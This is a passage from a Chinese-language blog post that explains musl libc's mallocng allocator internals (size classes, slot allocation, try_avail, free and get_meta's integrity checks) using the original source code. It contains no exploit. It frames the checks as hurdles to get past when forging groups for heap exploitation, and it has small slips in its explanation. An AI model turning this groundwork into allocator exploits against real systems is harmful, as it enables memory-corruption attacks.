5, the min counts for even size classes.</span></span><br><span class="line">	<span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">		<span class="type">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];</span><br><span class="line">		<span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">		<span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">		<span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">		    &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">			usage += <span class="number">3</span>;</span><br><span class="line">		<span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">			sc |= <span class="number">1</span>;</span><br><span class="line">		g = ctx.active[sc];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">		first = mask&amp;-mask;</span><br><span class="line">		<span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">			g-&gt;avail_mask = mask-first;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		idx = a_ctz_32(first);</span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line">	upgradelock();</span><br><span class="line"></span><br><span class="line">	idx = alloc_slot(sc, n);</span><br><span class="line">	<span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		unlock();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">success:</span><br><span class="line">	ctr = ctx.mmap_counter;</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">return</span> enframe(g, idx, n, ctr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>MMAP_THRESHOLD</code>等于131052。第一个判断如果为真，说明要分配一块很大的内存。首先计算一共需要的内存大小，这里<code>IB</code>等于4、<code>UNIT</code>等于16。然后使用<code>mmap</code>函数分配一块内存。如果分配成功，上读写锁。后面使用<code>alloc_meta</code>分配一个<code>meta</code>给这块大空间，之后设置这个<code>meta</code>的一些基本信息。</p>
<p>从这个if语句我们可以知道，如果一次内存申请的大小过大，musl libc会为这块空间专门分配一个meta和group，这个meta和group只管理这一个空间。</p>
<p>如果申请的空间较小，则进入下面的代码。</p>
<p><code>sc = size_to_class(n);</code>这条语句是为了计算这个大小的chunk应该被分到哪一个class。</p>
<p>在musl中定义有如下内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /src/malloc/mallocng/malloc.c, line 12</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">	<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">	<span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">	<span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">	<span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">	<span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">	<span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">	<span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">	<span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">	<span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">	<span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">	<span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>size_to_class</code>的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">size_to_class</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	n = (n+IB<span class="number">-1</span>)&gt;&gt;<span class="number">4</span>;</span><br><span class="line">	<span class="keyword">if</span> (n&lt;<span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">	n++;</span><br><span class="line">	<span class="type">int</span> i = (<span class="number">28</span>-a_clz_32(n))*<span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">	<span class="keyword">if</span> (n&gt;size_classes[i+<span class="number">1</span>]) i+=<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (n&gt;size_classes[i]) i++;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中经过试验可知<code>a_clz_32</code>这个函数返回的是n的最高位是32位中的倒数第几高位（最高位为0）。如<code>a_clz_32(1)=31</code>，<code>a_clz_32(2)=30</code>，<code>a_clz_32(4)=29</code>，以此类推。由此我们可以计算出不同大小的chunk对应于哪一个索引。这个部分实际上是将chunk的大小按照数组来进行分组，数组的每一项表示这一组中chunk右移4位的值不能超过多少。如索引为10的数组元素值为12，前面一个元素为10，则第10组chunk的大小范围应该在0x100-0x11F之间。同理，第11组chunk的大小范围为0x120-0x14F。</p>
<p>紧接着，上读写锁。后面<code>g = ctx.active[sc];</code>中的<code>ctx</code>指的是全局<code>__malloc_context</code>，其<code>active</code>数组长度与<code>size_classes</code>的相同，均为48。由此可见，<font color=red><strong>malloc_context将meta以管理的chunk大小进行分组，分组依据<code>size_classes</code>进行。</strong></font></p>
<p>再往下的一个if语句有很多的判断条件，在某些条件成立时会修改<code>meta</code>指针的值，对整体影响不大，先向下看。</p>
<p>下面是一个循环。<code>first = mask&amp;-mask;</code>是取<code>mask</code>的最低1位，即lowbit，这里的<code>avail_mask</code>实际就是选中的<code>meta</code>所管理的<code>group</code>中chunk的可用位，这里是通过可用位来查找第一个可用的chunk。内部的if-else语句是针对读写锁进行的检查，无需关注。如果在这里能够找到可用的chunk，则将chunk的索引保存到<code>idx</code>变量中。</p>
<p>如果在这个循环中没有找到合适的<code>idx</code>，则在循环外调用<code>alloc_slot</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">	<span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">	<span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	g-&gt;avail_mask--;</span><br><span class="line">	<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>try_avail</code>函数尝试从该大小的<code>meta</code>中分配出一个可用的chunk并返回索引，如果该可用chunk不是由位于链首的<code>meta</code>所提供，则会将这个chunk所在的meta移动至链首。如果尝试分配成功，则这里直接返回。否则，后面调用<code>alloc_group</code>函数创建一个新的<code>meta</code>，创建成功后将其中的第一个chunk的索引（即0）返回，并将该<code>meta</code>放在链首。不论如何，最终只要能够执行到标号<code>success</code>，就一定能够获取到<code>idx</code>的值。</p>
<p>最后返回调用了<code>enframe</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">enframe</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> idx, <span class="type">size_t</span> n, <span class="type">int</span> ctr)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line">	<span class="type">size_t</span> slack = (stride-IB-n)/UNIT;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *p = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *end = p+stride-IB;</span><br><span class="line">	<span class="comment">// cycle offset within slot to increase interval to address</span></span><br><span class="line">	<span class="comment">// reuse, facilitate trapping double-free.</span></span><br><span class="line">	<span class="type">int</span> off = (p[<span class="number">-3</span>] ? *(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) + <span class="number">1</span> : ctr) &amp; <span class="number">255</span>;</span><br><span class="line">	assert(!p[<span class="number">-4</span>]);</span><br><span class="line">	<span class="keyword">if</span> (off &gt; slack) &#123;</span><br><span class="line">		<span class="type">size_t</span> m = slack;</span><br><span class="line">		m |= m&gt;&gt;<span class="number">1</span>; m |= m&gt;&gt;<span class="number">2</span>; m |= m&gt;&gt;<span class="number">4</span>;</span><br><span class="line">		off &amp;= m;</span><br><span class="line">		<span class="keyword">if</span> (off &gt; slack) off -= slack+<span class="number">1</span>;</span><br><span class="line">		assert(off &lt;= slack);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (off) &#123;</span><br><span class="line">		<span class="comment">// store offset in unused header at offset zero</span></span><br><span class="line">		<span class="comment">// if enframing at non-zero offset.</span></span><br><span class="line">		*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = off;</span><br><span class="line">		p[<span class="number">-3</span>] = <span class="number">7</span>&lt;&lt;<span class="number">5</span>;</span><br><span class="line">		p += UNIT*off;</span><br><span class="line">		<span class="comment">// for nonzero offset there is no permanent check</span></span><br><span class="line">		<span class="comment">// byte, so make one.</span></span><br><span class="line">		p[<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = (<span class="type">size_t</span>)(p-g-&gt;mem-&gt;storage)/UNIT;</span><br><span class="line">	p[<span class="number">-3</span>] = idx;</span><br><span class="line">	set_size(p, end, n);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的主要作用是从指定<code>meta</code>中取出指定索引的<code>chunk</code>。</p>
<h2 id="try_availsrcmallocmallocngmallocc-line-114"><a class="markdownIt-Anchor" href="#try_availsrcmallocmallocngmallocc-line-114"></a> try_avail（<code>/src/malloc/mallocng/malloc.c, line 114</code>）</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">try_avail</span><span class="params">(<span class="keyword">struct</span> meta **pm)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line">	<span class="type">uint32_t</span> first;</span><br><span class="line">	<span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line">	<span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (!m-&gt;freed_mask) &#123;</span><br><span class="line">			dequeue(pm, m);</span><br><span class="line">			m = *pm;</span><br><span class="line">			<span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			m = m-&gt;next;</span><br><span class="line">			*pm = m;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		mask = m-&gt;freed_mask;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// skip fully-free group unless it&#x27;s the only one</span></span><br><span class="line">		<span class="comment">// or it&#x27;s a permanently non-freeable group</span></span><br><span class="line">		<span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable) &#123;</span><br><span class="line">			m = m-&gt;next;</span><br><span class="line">			*pm = m;</span><br><span class="line">			mask = m-&gt;freed_mask;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">		<span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">		<span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">		<span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">		<span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>))) &#123;</span><br><span class="line">			<span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">				m = m-&gt;next;</span><br><span class="line">				*pm = m;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">				<span class="type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line">				<span class="type">int</span> span = UNIT + size*cnt;</span><br><span class="line">				<span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">				<span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) &#123;</span><br><span class="line">					cnt++;</span><br><span class="line">					span += size;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">					cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">				m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		mask = activate_group(m);</span><br><span class="line">		assert(mask);</span><br><span class="line">		decay_bounces(m-&gt;sizeclass);</span><br><span class="line">	&#125;</span><br><span class="line">	first = mask&amp;-mask;</span><br><span class="line">	m-&gt;avail_mask = mask-first;</span><br><span class="line">	<span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过查找，这个函数只在<code>alloc_slot</code>这一处被调用，参数填的是一个<code>meta</code>链表的链首地址指针。</p>
<p>这个函数的参数是<code>meta</code>的二重指针，首先解引用一层获取到<code>meta</code>指针，如果这个<code>meta</code>指针无效，则返回0。</p>
<p>如果该<code>meta</code>存在，则取出其<code>avail_mask</code>。如果这个值为0，说明这个<code>meta</code>中已经没有可以用来分配的chunk了。这就进入到大if语句体内：</p>
<p><strong><code>free_mask</code>与<code>avail_mask</code>相同，以比特位标识，每一个比特位表示一个chunk是否被释放。如被释放则比特值为1</strong>。<mark>如果<code>free_mask</code>为0</mark>，而此时<code>avail_mask</code>也为1，说明这个<code>meta</code>中既不能分配<code>chunk</code>，也没有已经释放的<code>chunk</code>，这种情况下应该将这个<code>meta</code>从链表中移除，即调用<code>dequeue</code>函数脱链。脱链之后<code>pm</code>应该指向新的链首<code>meta</code>指针。如果链表中没有其他<code>meta</code>，就返回0。<mark>如果<code>free_mask</code>不为0</mark>，则找到下一个<code>meta</code>，并将链首修改为这个<code>meta</code>。</p>
<p>之后检查新链首<code>meta</code>中的chunk是否全部被释放且该<code>meta</code>不是不可释放的。这里的<code>mask == (2u&lt;&lt;m-&gt;last_idx)-1</code>就是在判断<code>free_mask</code>的所有有效的比特是不是全为1，如果是则跳过该chunk并再次修改链首的<code>meta</code>为下一个<code>meta</code>。</p>
<p>下面是<code>if (!(mask &amp; ((2u&lt;&lt;m-&gt;mem-&gt;active_idx)-1)))</code>，<code>mask</code>是释放chunk的掩码，后面是全1的掩码，如果两者相与等于0，说明这个<code>meta</code>中没有chunk被释放。这个if语句是想要尽可能地使用已经有chunk被释放的<code>meta</code>而尽可能保留全部chunk都可以使用的<code>meta</code>，这样做的目的是减少脏页面的产生。内部判断如果这个<code>meta</code>不是仅有的一个<code>meta</code>，则使用下一个<code>meta</code>，否则没办法就只能使用这个“干净的”<code>meta</code>，else中所做的是在<code>group</code>中选择一个可以使用的chunk并设置相应控制位。</p>
<p>循环外面，是设置<code>meta</code>的<code>avail_mask</code>位，并返回将要分配出去的chunk索引。</p>
<h2 id="freesrcmallocmallocngfreec-line-101"><a class="markdownIt-Anchor" href="#freesrcmallocmallocngfreec-line-101"></a> free（<code>/src/malloc/mallocng/free.c, line 101</code>）</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line">	<span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">	<span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line">	get_nominal_size(p, end);</span><br><span class="line">	<span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line">	((<span class="type">unsigned</span> <span class="type">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">	<span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line">	<span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">	*(<span class="type">uint16_t</span> *)((<span class="type">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line">	<span class="comment">// unless it&#x27;s a single-slot group that will be unmapped.</span></span><br><span class="line">	<span class="keyword">if</span> (((<span class="type">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="type">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">		<span class="type">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">		<span class="keyword">if</span> (len) &#123;</span><br><span class="line">			<span class="type">int</span> e = errno;</span><br><span class="line">			madvise(base, len, MADV_FREE);</span><br><span class="line">			errno = e;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">		<span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">		<span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">		assert(!(mask&amp;self));</span><br><span class="line">		<span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (!MT)</span><br><span class="line">			g-&gt;freed_mask = freed+self;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	wrlock();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">if</span> (mi.len) &#123;</span><br><span class="line">		<span class="type">int</span> e = errno;</span><br><span class="line">		munmap(mi.base, mi.len);</span><br><span class="line">		errno = e;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>free用于释放chunk，首先需要找到该chunk所在的meta。这个功能是如何实现的呢？</p>
<p>每一个chunk的前面都保存着这个chunk在<code>group</code>中的索引，通过<code>get_slot_index</code>函数我们就可以知道：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">get_slot_index</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> p[<span class="number">-3</span>] &amp; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见索引值保存在索引为-3的位置。</p>
<p>对于索引值不为0的chunk，其还有一个<code>offset</code>保存在索引为-2的位置，它记录了当前chunk与第一个chunk首部的偏移量（右移4位的结果），因此通过这个值我们可以计算出该chunk所在<code>group</code>的首地址，由<code>group</code>中保存的<code>meta</code>地址找到<code>meta</code>。在<code>get_meta</code>函数中，找到<code>meta</code>后又找到了该<code>meta</code>所在的<code>meta_area</code>并进行了多项检查，防止<code>group</code>被伪造，如果我们想要通过伪造group来进行漏洞利用，就需要特别注意这里，这个我们以后再说。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /src/malloc/mallocng/meta.h, line 129</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">	<span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> index = get_slot_index(p);</span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	assert(meta-&gt;mem == base);</span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span 